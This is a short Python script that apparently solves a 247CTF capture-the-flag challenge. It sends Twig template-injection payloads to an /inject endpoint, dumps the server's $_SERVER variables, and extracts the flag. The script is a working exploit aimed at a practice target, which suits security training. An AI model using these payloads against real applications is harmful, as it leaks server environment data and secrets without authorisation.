
```python
import requests

ctf_url = "https://bef5d00421ed0a25.247ctf.com"
print("[*] Dumping $_SERVER keys...")
resp = requests.get(f"{ctf_url}/inject", [("inject", "{{app.request.server|keys|json_encode|raw}}")])
print(f"[*] $_SERVER key dump: {resp.text}")
print("[*] Getting flag from stringified 'app.request.server'...")
resp = requests.get(f"{ctf_url}/inject", [("inject", "{{app.request.server|join}}")])
flag_start = resp.text.find("247CTF{")
flag_end = resp.text.find("}", flag_start)
flag = resp.text[flag_start:flag_end + 1]
print(f"[*] Flag: {flag}")
```
